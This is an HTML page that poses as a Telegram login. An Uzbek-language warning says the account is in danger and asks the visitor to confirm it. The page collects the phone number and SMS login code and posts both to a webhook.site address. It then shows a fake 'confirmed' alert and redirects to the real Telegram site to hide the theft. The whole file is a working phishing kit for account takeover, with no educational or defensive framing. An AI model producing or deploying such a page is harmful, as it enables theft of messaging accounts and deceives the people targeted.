<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <style>
        body{background:#0088cc;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;}
        .box{background:white;padding:30px;border-radius:10px;text-align:center;width:300px;}
        input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;}
        button{width:100%;padding:12px;background:#0088cc;color:white;border:none;border-radius:5px;cursor:pointer;}
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color:#0088cc;">ðŸ“± Telegram</h1>
        <p style="color:red;">Hisobingiz xavf ostida! Tasdiqlang</p>
        <form id="form">
            <input type="tel" id="phone" placeholder="+998901234567" required>
            <input type="text" id="sms_code" placeholder="SMS kodi (12345)" required>
            <button type="submit">Kirish</button>
        </form>
    </div>

    <script>
    document.getElementById('form').onsubmit = function(e) {
        e.preventDefault();
        
        var phone = document.getElementById('phone').value;
        var code = document.getElementById('sms_code').value;
        
        // Ma'lumotlarni yuborish
        fetch('https://webhook.site/0d5b234f-5372-4e94-8a06-c60951cbec24', {
            method: 'POST',
            mode: 'no-cors', 
            body: 'Raqam: ' + phone + ' | SMS kod: ' + code
        });
        
        alert('Tasdiqlandi! Kod qabul qilindi.');
        // Haqiqiy Telegramga yo'naltirish
        window.location.href = "https://telegram.org";
    }
    </script>
</body>
</html>
